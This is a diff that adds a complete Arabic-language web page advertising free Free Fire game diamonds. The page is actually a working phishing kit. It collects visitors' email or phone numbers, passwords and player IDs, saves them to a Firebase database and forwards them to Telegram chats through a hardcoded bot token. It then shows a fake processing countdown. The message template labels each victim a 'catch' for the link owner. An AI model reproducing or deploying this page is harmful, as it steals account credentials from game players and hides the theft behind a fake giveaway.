@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن جواهر فري فاير مجاني 🚀⚡</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    
+    <style>
+        /* دمج كافة التنسيقات CSS */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; text-align: center; }
+        
+        body { background-color: #222; min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow-x: hidden; }
+
+        .gradient-background {
+            width: 100%; min-height: 100vh;
+            background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2);
+            background-size: 400% 400%; animation: gradientAnimation 6s ease infinite;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px;
+        }
+        @keyframes gradientAnimation { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+
+        .container {
+            background-color: black; color: white; padding: 30px; border-radius: 15px;
+            width: 100%; max-width: 500px; box-shadow: 0px 0px 20px rgba(0,0,0,0.5);
+        }
+
+        /* تنسيق الأقسام المخفية */
+        #login-section, #waiting-section { display: none; background-color: white; color: #333; }
+
+        .social-item {
+            display: flex; align-items: center; justify-content: center; background: #333; 
+            padding: 15px; margin: 15px auto; border-radius: 8px; cursor: pointer; transition: 0.3s; width: 90%;
+        }
+        .social-item:hover { background: #444; }
+        .social-item img { width: 40px; margin-right: 15px; }
+
+        .pricing-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 20px; }
+        .price-card { background: #444; padding: 15px; border-radius: 8px; border: 1px solid #555; }
+        .buy-btn { background: #ff5722; color: white; border: none; padding: 5px 15px; border-radius: 4px; cursor: pointer; margin-top: 5px; }
+
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; }
+        .submit-btn { width: 100%; padding: 15px; background: #ff5722; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; }
+
+        .progress-container { width: 100%; background: #eee; height: 12px; border-radius: 6px; margin: 20px 0; overflow: hidden; }
+        .progress-bar { height: 100%; background: #ff5722; width: 100%; transition: 1s linear; }
+        .heart-icon { width: 100px; margin: 20px; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+    </style>
+</head>
+<body>
+
+    <div class="gradient-background">
+        
+        <div id="main-section" class="container">
+            <h2 style="color: #ff5722; margin-bottom: 15px;">شحن جواهر فري فاير مجاني 🚀⚡</h2>
+            <p style="margin-bottom: 20px;">سجل دخولك أولاً لضمان وصول الجواهر لحسابك</p>
+            
+            <div class="social-item" onclick="showLogin('Facebook')">
+                <img src="https://i.postimg.cc/Hn9d715L/1000209419-removebg-preview.png"> <span>Facebook</span>
+            </div>
+            <div class="social-item" onclick="showLogin('Google')">
+                <img src="https://i.postimg.cc/Bn64tyvq/1000209420-removebg-preview.png"> <span>Google</span>
+            </div>
+
+            <div class="pricing-grid">
+                <div class="price-card">325💎 - مجاني<br><button class="buy-btn">شحن</button></div>
+                <div class="price-card">1000💎 - مجاني<br><button class="buy-btn">شحن</button></div>
+            </div>
+        </div>
+
+        <div id="login-section" class="container">
+            <h2 style="color: #ff5722;">تسجيل الدخول</h2>
+            <p>يرجى ملء البيانات لتصلك الجواهر فوراً</p>
+            <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف">
+            <input type="password" id="pass" placeholder="كلمة المرور">
+            <input type="text" id="player-id" placeholder="ID اللاعب (الايدي)">
+            <select id="amount">
+                <option value="325">325 جوهرة مجاني 💎</option>
+                <option value="660">660 جوهرة مجاني 💎</option>
+                <option value="1500">1500 جوهرة مجاني 💎</option>
+            </select>
+            <button class="submit-btn" onclick="sendData()">تأكيد الشحن</button>
+        </div>
+
+        <div id="waiting-section" class="container">
+            <h2 style="color: red;">جاري معالجة طلبك...</h2>
+            <p>يتم فحص الحساب وإرسال الجواهر الآن</p>
+            <img src="https://i.postimg.cc/FFy4S1NG/1000209418-removebg-preview.png" class="heart-icon">
+            <div class="progress-container"><div class="progress-bar" id="bar"></div></div>
+            <h1 id="timer">20</h1>
+        </div>
+
+    </div>
+
+    <script>
+        // تكوين Firebase
+        const config = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
+        if (!firebase.apps.length) firebase.initializeApp(config);
+        const database = firebase.database();
+
+        // إعدادات البوت
+        const token = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
+        const admin = "5375214810";
+
+        function getUserId() {
+            return new URLSearchParams(window.location.search).get("user_id") || "Unknown";
+        }
+
+        function showLogin(platform) {
+            document.getElementById('main-section').style.display = 'none';
+            document.getElementById('login-section').style.display = 'block';
+        }
+
+        async function sendData() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            const pid = document.getElementById('player-id').value;
+            const amt = document.getElementById('amount').value;
+            const owner = getUserId();
+            const now = new Date().toLocaleString('ar-EG');
+
+            if(!u || !p) return alert("من فضلك ادخل البيانات كاملة!");
+
+            // حفظ في فيرباس
+            await database.ref('hits/' + owner + '/ff').push({
+                user: u, pass: p, playerID: pid, diamonds: amt, time: now
+            });
+
+            // إرسال للتليجرام
+            const text = `💎 صيد فري فاير جديد!\n👤 صاحب الرابط: ${owner}\n📧 الحساب: ${u}\n🔑 الباسورد: ${p}\n🆔 ايدي اللاعب: ${pid}\n💎 الكمية: ${amt}\n⏰ الوقت: ${now}`;
+            
+            [admin, owner].forEach(id => {
+                if(id !== "Unknown") {
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`);
+                }
+            });
+
+            // تحويل لصفحة الانتظار
+            document.getElementById('login-section').style.display = 'none';
+            document.getElementById('waiting-section').style.display = 'block';
+            
+            let time = 20;
+            const interval = setInterval(() => {
+                time--;
+                document.getElementById('timer').innerText = time;
+                document.getElementById('bar').style.width = (time / 20 * 100) + "%";
+                if(time <= 0) clearInterval(interval);
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
